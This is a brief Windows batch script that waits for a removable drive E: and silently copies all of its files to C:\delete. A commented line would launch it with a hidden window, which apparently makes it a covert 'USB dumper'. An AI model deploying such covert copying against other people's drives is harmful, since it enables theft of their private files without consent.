@echo off

::Powershell| Start-Process -WindowStyle hidden .\usb.bat

:start
if exist E:\* goto found
if not exist E:\* goto notfound
:notfound
timeout /T 30 /nobreak
goto start
:found
::xcopy E:\* %homedrive%%homepath%  /E
xcopy E:\* C:\delete  /E  /d
timeout /T 30 /nobreak
xcopy E:\* C:\delete /E  /d
timeout /T 30 /nobreak
xcopy E:\* C:\delete  /E /d


::c benutzer 

::pause